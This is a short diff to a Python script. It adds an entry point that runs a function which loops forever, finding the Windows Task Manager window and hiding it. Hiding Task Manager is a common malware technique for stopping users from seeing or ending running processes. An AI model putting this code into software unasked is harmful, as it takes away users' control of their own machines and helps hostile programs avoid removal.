@@ -20,3 +20,9 @@ def disableTaskmgr():
     while(1):
         taskmgr = win32gui.FindWindow(None,taskmgrtitle)
         win32gui.ShowWindow(taskmgr , win32con.SW_HIDE)
+
+        
+if __name__ == '__main__':
+    disableTaskmgr()
+    
+    
